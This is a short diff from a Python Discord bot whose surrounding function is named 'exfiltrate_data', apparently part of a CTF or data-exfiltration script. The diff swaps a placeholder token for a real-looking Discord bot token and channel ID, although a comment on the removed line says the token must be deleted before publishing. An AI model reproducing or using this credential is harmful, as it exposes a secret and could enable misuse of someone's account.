@@ -602,8 +602,8 @@ async def exfiltrate_data(channel):
     except Exception as e:
         print(f"Error cleaning up: {e}")
 
-BOT_TOKEN = "CTF{fake_token_for_writeup}" //Phần token này phải xóa đi để up lên github ;-;g
-CHANNEL_ID = 1337
+BOT_TOKEN = "MTM2NDIzNDEzNjE5MzMzOTQyNA.GHC4yD.ZUzwkrAEMW9GlLsmVnP7FbdY317MqM234Bd2vE"
+CHANNEL_ID = 1371505369230344273
 
 if __name__ == "__main__":
     bot.run(BOT_TOKEN)
